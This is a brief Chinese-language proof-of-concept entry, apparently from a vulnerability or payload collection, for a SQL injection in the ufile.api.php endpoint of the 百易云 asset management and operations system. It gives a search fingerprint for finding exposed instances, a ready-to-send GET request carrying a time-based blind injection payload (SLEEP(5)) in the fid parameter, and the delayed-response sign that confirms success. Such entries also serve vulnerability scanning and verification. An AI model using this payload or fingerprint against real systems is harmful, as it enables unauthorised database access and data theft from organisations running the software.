# 百易云资产管理运营系统ufile.api.phpSQL注入漏洞

百易云资产管理运营系统ufile.api.php ｜ SQL注入 ｜ —
- **指纹**：`body="不要着急，点此"`
- **请求**：`GET /api/file/ufile.api.php?act=filedel&fid=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP(5)))UPCw) HTTP/1.1`
- **响应特征**：200 响应时间>=5s